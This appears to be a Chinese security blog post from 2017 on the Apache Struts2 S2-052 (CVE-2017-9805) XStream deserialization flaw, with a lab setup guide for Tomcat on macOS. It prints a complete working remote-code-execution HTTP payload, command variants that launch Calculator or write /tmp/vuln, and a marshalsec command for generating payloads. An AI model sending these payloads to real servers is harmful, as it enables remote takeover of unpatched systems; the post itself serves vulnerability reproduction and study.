---
title: struts2-052漏洞
copyright: true
permalink: 1
top: 0
date: 2017-09-06 16:26:05
tags:
- struts2
categories: web安全
password:
---
<blockquote class="blockquote-center">From small beginnings comes great things
伟大始于渺小</blockquote>
　　今年struts2疯了，被爆出了很多高危漏洞，之前我研究过s_045、s_046漏洞，近期又出现了s_052漏洞，同样是命令执行，但这次危害稍微小一些，因为利用环境比较苛刻，需要使用XStream插件。
<!-- more -->
免责申明：*文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负*

### s2-052漏洞介绍
s2-052漏洞是当用户使用带有XStream程序的Struts-REST插件来处理XML-payloads时，会遭到远程代码执行攻击。
漏洞编号：CVE-2017-9805（S2-052）
漏洞影响：Struts2.5 – Struts2.5.12版本。

### s2-052 poc
```bash
POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/xml
Content-Length: 2365
Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit
Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7
Connection: close
Upgrade-Insecure-Requests: 1

<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
```

注意：执行命令的地方在于command内，这里是针对mac下的弹出计算器，如果是windows可改成calc.exe
```bash
<command>
<string>
/Applications/Calculator.app/Contents/MacOS/Calculator
</string>
</command>
```

### s2-052漏洞复现
#### mac install tomcat
在安装tomcat前，先检测一下mac上有没有安装java，可以运行java -version。
```bash
java version "1.8.0_111"
Java(TM) SE Runtime Environment (build 1.8.0_111-b14)
Java HotSpot(TM) 64-Bit Server VM (build 25.111-b14, mixed mode)
```
前往tomcat官网下载：http://tomcat.apache.org/download-80.cgi?from_33lc.com 选择下载Core下的tar.gz包到本地，然后解压。
将解压后到文件夹移动到/Library目录下,并命名为Tomcat；然后设置权限：
```bash
sudo chmod 755 /Library/Tomcat/bin/*.sh
```
进入/Library/Tomcat/bin/目录，运行启动tomcat
```bash
sudo sh startup.sh
```
访问：http://127.0.0.1:8080
注意：若要修改tomcat端口，可打开/Library/Tomcat/conf/server.xml文件，修改8080端口。

编写启动关闭tomcat脚本：
将以下内容写入tomcat文件中（自己创建）
```bash
#!/bin/bash
case $1 in
start)
sh /Library/Tomcat/bin/startup.sh
;;
stop)
sh /Library/Tomcat/bin/shutdown.sh
;;
restart)
sh /Library/Tomcat/bin/shutdown.sh
sh /Library/Tomcat/bin/startup.sh
;;
*)
echo “Usage: start|stop|restart”
;;
esac
exit 0
```
赋予文件权限：
```bash
chmod 777 tomcat
```
添加环境变量：
```bash
export PATH="$PATH:/Library/Tomcat/bin"
```
然后运行启动关闭tomcat：
```bash
sudo tomcat start
sudo tomcat stop
```
注：linux、windows安装tomcat方法都与之类似，这里不再演示。

#### 下载部署存在漏洞的struts2版本
从struts2的官网下载最后受影响的版本[struts-2.5.12](http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip)解压后，将apps目录下的struts2-rest-showcase.war文件放到webapps目录下（/Library/Tomcat/webapps）重启tomcat后访问：http://127.0.0.1:8080/struts2-rest-showcase/

![](/upload_image/20170906/1.png)
由于burpsuite监控的端口也是8080，所以我将tomcat的端口改成8081了。

#### 构造post包
可以直接使用上面的poc发包，也可以自己抓取数据包重放，自己抓取的方式是点击页面上的编辑，然后点击submit提交，抓取post包，再修改post的body字段为此漏洞的poc。

#### 尝试不同的poc
网上使用最多的poc是弹出一个计算器，然而我在mac上测试发现弹出计算器失败了，因此换了一个写文件的poc，发现测试成功。

写文件poc：（会在/tmp/下生成vuln文件）
```bash
<command><string>/usr/bin/touch</string><string>/tmp/vuln</string> </command>
```
弹计算器poc
```bash
Mac:
<command><string>/Applications/Calculator.app/Contents/MacOS/Calculator</string></command>

windows:
<command><string>clac.exe</string></command>
```

### poc生成
```bash
java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.XStream ImageIO calc.exe > poc.txt
```
marshalsec-0.0.1-SNAPSHOT-all.jar网上可以下载，这里不给出地址了，自行搜索。


### 参考文章
http://www.freebuf.com/vuls/146718.html
https://www.t00ls.net/thread-41942-1-1.html
http://www.imooc.com/article/6453
https://github.com/jas502n/St2-052/blob/master/README.md

### 传送门
[struts2-046漏洞](http://thief.one/2017/03/21/Struts2-046%E6%BC%8F%E6%B4%9E/)
[struts2_045漏洞](http://thief.one/2017/03/07/Struts2-045%E6%BC%8F%E6%B4%9E/)
[struts2漏洞poc汇总](http://thief.one/2017/03/13/Struts2%E6%BC%8F%E6%B4%9EPOC%E6%B1%87%E6%80%BB/)



